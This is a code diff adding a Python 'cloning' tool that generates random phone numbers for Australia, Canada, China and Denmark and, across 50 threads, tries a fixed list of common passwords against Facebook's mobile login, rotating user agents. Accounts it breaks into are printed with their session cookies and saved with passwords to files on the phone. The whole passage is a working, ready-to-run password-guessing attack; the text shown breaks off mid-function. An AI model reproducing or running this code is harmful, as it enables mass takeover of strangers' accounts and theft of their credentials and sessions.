+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def australia():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo20)
 	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.455")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+61"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo20)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+61"
-		os.system('clear')
-		print(logo)
-		print(logo20)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def canada():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo21)
 	print("\x1b[1;97m(leave the first one digits and the last seven digits of any phone number in this country.Write the remaining digits here.555,")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+1"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo21)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+1"
-		os.system('clear')
-		print(logo)
-		print(logo21)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def china():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo22)
 	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.1355,1555,1855,")
+	code = input(" \x1b[1;97mchoose code  : ")
+	k="+86"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo22)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input(" \x1b[1;97mchoose code  : ")
-		k="+86"
-		os.system('clear')
-		print(logo)
-		print(logo22)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def denmark():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo23)
 	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.2,3,4,5,6,7,8")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+45"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo23)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
